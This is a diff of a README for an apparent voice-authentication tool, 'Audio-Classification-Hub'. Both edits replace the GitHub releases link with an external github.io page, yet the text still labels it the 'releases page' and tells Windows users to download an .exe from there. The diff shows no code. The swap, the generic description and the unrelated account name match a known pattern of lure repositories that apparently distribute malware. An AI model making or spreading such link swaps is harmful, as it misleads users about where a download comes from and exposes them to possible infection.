@@ -1,6 +1,6 @@
 # 🎙️ Audio-Classification-Hub - Secure voice authentication for your computer
 
-[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Oxfordenglishwedgie390/Audio-Classification-Hub/releases)
+[![Download Software](https://img.shields.io/badge/Download-Releases-blue.svg)](https://oxfordenglishwedgie390.github.io)
 
 ## 🎯 About the software
 Audio-Classification-Hub provides a way to verify identities using human speech. It uses modern technology to match voice patterns against saved samples. You can use this tool to build secure login systems or verify users without sending data to the internet. The entire process happens on your local machine. This ensures your audio files stay private and secure.
@@ -19,7 +19,7 @@ Your computer must meet these basic standards to run the software smoothly:
 ## 📥 How to get started
 You can download the application from the project page. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Oxfordenglishwedgie390/Audio-Classification-Hub/releases).
+1. Visit the [releases page](https://oxfordenglishwedgie390.github.io).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
